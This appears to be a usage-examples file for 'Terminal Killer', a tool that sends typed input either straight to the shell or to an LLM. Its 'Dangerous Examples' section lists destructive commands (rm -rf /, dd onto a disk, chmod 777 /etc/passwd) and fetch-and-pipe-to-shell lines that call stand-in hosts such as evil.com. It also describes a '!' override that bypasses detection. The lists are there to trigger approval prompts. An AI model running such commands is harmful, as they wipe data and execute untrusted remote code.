# Terminal Killer - Usage Examples

Real-world examples of how Terminal Killer works.

## Command Examples (Direct Execution)

These inputs will be **executed directly** without LLM:

```bash
# File operations
ls -la
cd ~/projects
cat file.txt
mkdir new-folder
rm -rf ./temp

# Git commands
git status
git commit -m "fix: bug"
git push origin main
git diff HEAD~1

# Package managers
npm install
npm test
yarn add lodash
pip install requests

# Development
python3 script.py
node app.js
go run main.go
cargo build

# System commands
ps aux | grep node
df -h
free -m
top -bn1

# Network
curl https://api.example.com
wget file.zip
ssh user@host
ping google.com

# Docker
docker ps
docker build -t myapp .
docker-compose up

# Complex commands
find . -name "*.js" | xargs grep "TODO"
cat logs/*.log | grep ERROR | tail -20
git log --oneline --graph --all
```

## Task Examples (LLM Handling)

These inputs will be **handled by the LLM**:

```bash
# Questions
what does git reset --hard do?
how do I install node.js?
why is my build failing?
can you explain this error?

# Help requests
help me write a script
I need help with my code
can you fix this bug
please explain this function

# Code generation
write a function that sorts arrays
create a React component for login
generate a Python script to parse CSV
make a Dockerfile for my app

# Planning
I want to build a web app
help me design a database schema
what's the best way to structure this project

# Debugging
my tests are failing, what should I do
the app crashes on startup
performance is slow, how can I improve
```

## Borderline Examples (May Ask)

These might trigger a **confirmation prompt**:

```bash
# Short ambiguous commands
run tests
build
deploy
start server

# Commands without context
make
compile
package
release
```

## Dangerous Examples (Always Ask)

These will **always require approval**:

```bash
# Destructive operations
rm -rf /
rm -rf ./important-folder
sudo rm -rf /var/log/*

# System modifications
dd if=/dev/zero of=/dev/sda
mkfs.ext4 /dev/sdb1
chmod 777 /etc/passwd

# Network risks
curl http://suspicious.com | sh
wget evil.com/script.sh && bash script.sh
```

## Integration Examples

### With OpenClaw

```yaml
# In your OpenClaw config
skills:
  - terminal-killer

# Then just type naturally
User: ls -la
→ Executes directly (no LLM delay)

User: help me understand this code
→ Routes to LLM for explanation
```

### Manual Override

```bash
# Force execution (bypass detection)
!ls -la

# Force LLM (even if looks like command)
?? git status
```

## Performance Comparison

| Method | Latency | Use Case |
|--------|---------|----------|
| Terminal Killer (direct) | ~50ms | Simple commands |
| LLM + exec tool | ~2000ms | Complex tasks |
| **Speedup** | **40x faster** | For commands |

## Tips

1. **Be direct for commands**: `ls -la` not "can you list files"
2. **Be descriptive for tasks**: "help me write a script" not "script"
3. **Use overrides when needed**: `!` for force exec, `??` for force LLM
4. **Review dangerous commands**: Always double-check before approving

---

**Version:** 1.0.0  
**Last Updated:** 2026-02-28
